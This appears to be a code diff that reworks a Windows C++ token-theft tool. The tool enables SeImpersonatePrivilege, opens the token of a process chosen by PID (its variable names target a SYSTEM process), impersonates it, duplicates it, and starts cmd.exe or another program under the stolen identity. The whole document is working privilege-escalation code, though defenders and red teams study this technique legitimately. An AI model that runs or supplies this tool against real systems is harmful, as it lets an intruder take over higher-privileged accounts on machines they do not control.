@@ -1,11 +1,13 @@
 #include <Windows.h>
 #include <iostream>
 
-BOOL EnablePrivilege(HANDLE hToken, LPCWSTR privilege) {
+BOOL EnablePrivilege(HANDLE hToken, LPCWSTR pwszPrivilege)
+{
     TOKEN_PRIVILEGES tp;
     LUID luid;
 
-    if (!LookupPrivilegeValueW(NULL, privilege, &luid)) {
+    if (!LookupPrivilegeValue(NULL, pwszPrivilege, &luid))
+    {
         std::cout << "[-] LookupPrivilegeValue failed. Error: " << GetLastError() << "\n";
         return FALSE;
     }
@@ -14,8 +16,15 @@ BOOL EnablePrivilege(HANDLE hToken, LPCWSTR privilege) {
     tp.Privileges[0].Luid = luid;
     tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
 
-    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
+    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL))
+    {
         std::cout << "[-] AdjustTokenPrivileges failed. Error: " << GetLastError() << "\n";
+        return FALSE;
+    }
+
+    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
+    {
+        std::cout << "[-] The token does not have the specified privilege.\n";
         return FALSE;
     }
 
@@ -23,14 +32,18 @@ BOOL EnablePrivilege(HANDLE hToken, LPCWSTR privilege) {
 }
 
 int main(int argc, char** argv) {
+    // Check the arguments
     if (argc < 2) {
         std::cout << "Usage: " << argv[0] << " <Source PID> [Program Path] [Arguments]\n";
-        return 1;
+        return -1;
     }
 
-    DWORD sourcePid = atoi(argv[1]);
+    // Get the PID
+    char* pid_c = argv[1];
+    DWORD systemProcessId = atoi(pid_c);
     LPCWSTR program = L"cmd.exe";
     LPWSTR arguments = NULL;
+
 
     // If a second parameter is provided, use it as the program path
     if (argc >= 3) {
@@ -48,71 +61,90 @@ int main(int argc, char** argv) {
         arguments = wideArguments;
     }
 
-    // Open the current process token to enable SeDebugPrivilege
+    // Open the current process token
     HANDLE hCurrentProcessToken;
-    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hCurrentProcessToken)) {
+    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hCurrentProcessToken))
+    {
         std::cout << "[-] OpenProcessToken failed. Error: " << GetLastError() << "\n";
-        return 1;
+        return -1;
     }
 
-    // Enable SeDebugPrivilege
-    if (!EnablePrivilege(hCurrentProcessToken, L"SeDebugPrivilege")) {
-        std::cout << "[-] Failed to enable SeDebugPrivilege.\n";
-        return 1;
-    }
-    std::cout << "[+] SeDebugPrivilege enabled.\n";
-
-    // Open the source process
-    HANDLE hSourceProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, sourcePid);
-    if (!hSourceProcess) {
-        std::cout << "[-] OpenProcess (Source) failed. Error: " << GetLastError() << "\n";
-        return 1;
+    // Enable the specified privilege
+    if (EnablePrivilege(hCurrentProcessToken, SE_IMPERSONATE_NAME))
+    {
+        std::cout << "[+] SeImpersonatePrivilege enabled!\n";
     }
 
-    // Open the token of the source process
-    HANDLE hSourceToken;
-    if (!OpenProcessToken(hSourceProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hSourceToken)) {
-        std::cout << "[-] OpenProcessToken (Source) failed. Error: " << GetLastError() << "\n";
-        return 1;
+    // Open the token of the target process
+    HANDLE hSystemProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, TRUE, systemProcessId);
+    if (!hSystemProcess)
+    {
+        std::cout << "[-] OpenProcess failed. Error: " << GetLastError() << "\n";
+        CloseHandle(hSystemProcess);
+        return -1;
+    }
+    else {
+        std::cout << "[+] Process successfully opened!\n";
+    }
+
+    // Open the token of the target process
+    HANDLE hSystemToken;
+    if (!OpenProcessToken(hSystemProcess, MAXIMUM_ALLOWED, &hSystemToken))
+    {
+        std::cout << "[-] OpenProcessToken failed. Error: " << GetLastError() << "\n";
+        CloseHandle(hSystemProcess);
+        return -1;
+    }
+    else {
+        std::cout << "[+] New Process Token successfully opened!\n";
+    }
+
+    // Impersonate as the logged on user
+    if (!ImpersonateLoggedOnUser(hSystemToken))
+    {
+        std::cout << "[-] ImpersonateLoggedOnUser failed. Error: " << GetLastError() << "\n";
+        CloseHandle(hSystemToken);
+        CloseHandle(hSystemProcess);
+        return -1;
+    }
+    else {
+        std::cout << "[+] Impersonation Successful!\n";
     }
 
     // Duplicate the token
-    HANDLE hDuplicateToken;
-    if (!DuplicateTokenEx(hSourceToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hDuplicateToken)) {
+    HANDLE duplicateTokenHandle = NULL;
+    if (!DuplicateTokenEx(hSystemToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle))
+    {
         std::cout << "[-] DuplicateTokenEx failed. Error: " << GetLastError() << "\n";
-        return 1;
+        CloseHandle(hSystemToken);
+        return -1;
     }
-    std::cout << "[+] Token duplicated successfully!\n";
+    else {
+        std::cout << "[+] Token Duplicated Successfully!\n";
+    }
 
-    // Prepare to create the new process with the duplicated token
-    STARTUPINFOW si = { sizeof(STARTUPINFOW) };
+    // Create a new process as the target user
+    STARTUPINFO si = { sizeof(STARTUPINFO) };
     PROCESS_INFORMATION pi;
 
-    // Create the new process with the duplicated token
-    if (!CreateProcessWithTokenW(
-            hDuplicateToken,
-            LOGON_WITH_PROFILE,
-            program,
-            arguments,
-            CREATE_NEW_CONSOLE,
-            NULL,
-            NULL,
-            &si,
-            &pi))
+    ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
+    ZeroMemory(&si, sizeof(STARTUPINFO));
+    si.cb = sizeof(STARTUPINFO);
+
+    if (!CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, program, arguments, CREATE_UNICODE_ENVIRONMENT | CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi))
     {
         std::cout << "[-] CreateProcessWithTokenW failed. Error: " << GetLastError() << "\n";
-        return 1;
+        CloseHandle(hSystemToken);
+        CloseHandle(hSystemProcess);
+        return -1;
+    }
+    else {
+        std::cout << "[+] Process started successfully!\n";
     }
 
-    std::cout << "[+] Process started successfully!\n";
-
-    // Cleanup handles
-    CloseHandle(pi.hProcess);
-    CloseHandle(pi.hThread);
-    CloseHandle(hDuplicateToken);
-    CloseHandle(hSourceToken);
-    CloseHandle(hSourceProcess);
-    CloseHandle(hCurrentProcessToken);
+    // Close the handles
+    CloseHandle(hSystemToken);
+    CloseHandle(hSystemProcess);
 
     // Cleanup allocated memory
     if (argc >= 3) delete[] program;
